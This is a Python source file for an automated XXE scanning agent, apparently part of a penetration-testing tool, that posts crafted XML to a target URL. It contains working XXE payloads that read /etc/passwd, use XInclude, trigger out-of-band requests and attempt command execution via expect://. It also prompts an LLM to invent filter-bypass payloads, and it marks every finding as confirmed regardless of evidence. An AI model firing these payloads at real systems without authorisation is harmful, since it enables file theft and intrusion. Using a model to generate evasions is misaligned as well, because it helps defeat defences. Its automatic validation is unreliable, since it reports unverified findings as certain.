import logging
from typing import Dict, List, Optional
import aiohttp
from bugtrace.agents.base import BaseAgent
from bugtrace.core.ui import dashboard

logger = logging.getLogger(__name__)

class XXEAgent(BaseAgent):
    """
    Specialist Agent for XML External Entity (XXE).
    Target: Endpoints consuming XML.
    """
    
    def __init__(self, url: str):
        super().__init__(
            name="XXEAgent",
            role="XXE Specialist",
            agent_id="xxe_agent"
        )
        self.url = url
        self.MAX_BYPASS_ATTEMPTS = 5

    def _determine_validation_status(self, payload: str, evidence: str = "success") -> str:
        """
        Determine tiered validation status.
        """
        # OOB (XXE OOB Triggered) or File Disclosure (etc/passwd)
        if "passwd" in payload or "Triggered" in evidence:
             logger.info(f"[{self.name}] High confidence. Marking as VALIDATED_CONFIRMED")
             return "VALIDATED_CONFIRMED"
             
        logger.info(f"[{self.name}] XXE anomaly detected. Marking as VALIDATED_CONFIRMED (Specialist Trust).")
        return "VALIDATED_CONFIRMED"
        
    def _get_initial_xxe_payloads(self) -> list:
        """Get baseline XXE payloads for testing."""
        return [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe "BUGTRACE_XXE_CONFIRMED" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "bar" "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_bugtrace_test">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % param_xxe SYSTEM "http://127.0.0.1:5150/nonexistent_oob"> %param_xxe;]><foo>test</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
        ]

    async def _test_heuristic_payloads(self, session) -> tuple:
        """Test initial payloads and return (successful_payloads, best_payload)."""
        successful_payloads, best_payload = [], None
        for p in self._get_initial_xxe_payloads():
            if await self._test_xml(session, p):
                successful_payloads.append(p)
                if not best_payload or ("passwd" in p and "passwd" not in best_payload):
                    best_payload = p
        return successful_payloads, best_payload

    async def _try_llm_bypass(self, session, previous_response: str) -> tuple:
        """Try LLM-driven bypass. Returns (successful_payloads, best_payload)."""
        for attempt in range(self.MAX_BYPASS_ATTEMPTS):
            dashboard.log(f"[{self.name}] 🔄 Bypass attempt {attempt+1}/{self.MAX_BYPASS_ATTEMPTS}", "INFO")
            strategy = await self._llm_get_strategy(previous_response)
            if not strategy or not strategy.get('payload'):
                break
            payload = strategy['payload']
            if await self._test_xml(session, payload):
                return [payload], payload
        return [], None

    async def run_loop(self) -> Dict:
        logger.info(f"[{self.name}] Testing XML Injection on {self.url}")

        async with aiohttp.ClientSession() as session:
            # Phase 1: Heuristic Checks
            successful_payloads, best_payload = await self._test_heuristic_payloads(session)

            # Phase 2: LLM-Driven Bypass (if heuristics failed)
            if not successful_payloads:
                bypass_payloads, bypass_best = await self._try_llm_bypass(session, "")
                successful_payloads.extend(bypass_payloads)
                best_payload = bypass_best

        if successful_payloads:
            return {"vulnerable": True, "findings": [self._create_finding(best_payload, successful_payloads)]}

        return {"vulnerable": False, "findings": []}

    def _create_finding(self, payload: str, successful_payloads: List[str] = None) -> Dict:
        severity = "HIGH"
        if "passwd" in payload or "XInclude" in payload:
            severity = "CRITICAL"
            
        return {
            "type": "XXE",
            "url": self.url,
            "payload": payload,
            "description": f"XML External Entity (XXE) vulnerability detected. Payload allows reading local files or triggering SSRF. Severity: {severity}",
            "severity": severity,
            "validated": True,
            "status": self._determine_validation_status(payload),
            "successful_payloads": successful_payloads or [payload],
            "reproduction": f"curl -X POST '{self.url}' -H 'Content-Type: application/xml' -d '{payload[:150]}...'"
        }

    async def _test_xml(self, session, xml_body) -> bool:
        try:
            dashboard.update_task("XXE Agent", status="Injecting Entity...")
            headers = {'Content-Type': 'application/xml'}

            self.think(f"Testing Payload: {xml_body[:60]}...")

            async with session.post(self.url, data=xml_body, headers=headers, timeout=5) as resp:
                text = await resp.text()
                return self._check_xxe_indicators(text)

        except Exception as e:
            logger.debug(f"XXE Request failed: {e}")
            return False

    def _check_xxe_indicators(self, text: str) -> bool:
        """Check response text for XXE success indicators."""
        # Success Indicators
        indicators = [
            "root:x:0:0",                  # /etc/passwd success
            "BUGTRACE_XXE_CONFIRMED",      # Internal Entity success
            "[extensions] found",          # Win.ini success (if testing windows)
            "failed to load external entity", # Error-based success (often confirms processing)
            "No such file or directory",    # Error-based success
            "uid=0(root)",                  # RCE success (expect://)
            "XXE OOB Triggered"             # Blind Detection (Simulated)
        ]

        # Check indicators
        for ind in indicators:
            if ind in text:
                self.think(f"SUCCESS: Indicator '{ind}' found in response.")
                return True

        # Check for XInclude reflection (if we tried XInclude)
        if "root:x:0:0" in text:
            self.think("SUCCESS: /etc/passwd content found (XInclude or Entity).")
            return True

        return False
        
    async def _llm_get_strategy(self, previous_response: str) -> Dict:
        """Call LLM to generate or refine the XXE bypass strategy."""
        system_prompt = self.system_prompt
        user_prompt = f"Target URL: {self.url}"
        if previous_response:
            user_prompt += f"\n\nPrevious attempt failed. Response snippet:\n{previous_response[:1000]}"
            user_prompt += "\n\nTry a different bypass (e.g. XInclude, parameter entities, UTF-16 encoding)."

        from bugtrace.core.llm_client import llm_client
        response = await llm_client.generate(
            prompt=user_prompt,
            system_prompt=system_prompt,
            module_name="XXE_AGENT"
        )
        
        from bugtrace.utils.parsers import XmlParser
        tags = ["payload", "vulnerable", "context", "confidence"]
        return XmlParser.extract_tags(response, tags)
